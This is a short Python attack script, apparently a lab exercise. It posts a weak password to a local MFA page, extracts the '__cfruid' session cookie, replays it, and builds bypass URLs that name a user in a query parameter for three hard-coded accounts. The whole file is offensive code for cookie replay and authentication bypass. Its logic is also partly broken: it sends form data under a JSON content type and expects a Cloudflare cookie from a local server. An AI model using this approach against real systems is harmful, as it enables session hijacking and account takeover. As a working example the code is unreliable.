import requests
import json

# Perform the initial login to get the session cookie
login_url = "http://127.0.0.1:5500/mfa.html"
login_data = {
    "password": "123"
}

session = requests.Session()
response = session.post(login_url, data=login_data, headers={"Content-Type": "application/json"})

# Extract the session cookie from the response
session_cookie = session.cookies.get_dict()["__cfruid"]

# Perform the replay attack by reusing the session cookie
replay_url = "http://127.0.0.1:5500/mfa.html"
headers = {
    "Cookie": f"__cfruid={session_cookie}"
}
response = session.get(replay_url, headers=headers)

# Intercept the response and modify the URL to bypass the authentication
if "WELCOME lakxhit" in response.text:
    new_url = f"http://localhost:3000/nextpage.html?user=lakxhit"
    print(f"Replaying cookie for user 'lakxhit', redirecting to {new_url}")
elif "WELCOME ronaldo" in response.text:
    new_url = f"http://localhost:3000/nextpage.html?user=ronaldo"
    print(f"Replaying cookie for user 'ronaldo', redirecting to {new_url}")
elif "WELCOME travis" in response.text:
    new_url = f"http://localhost:3000/nextpage.html?user=travis"
    print(f"Replaying cookie for user 'travis', redirecting to {new_url}")
else:
    print("No matching user found, not replaying cookie")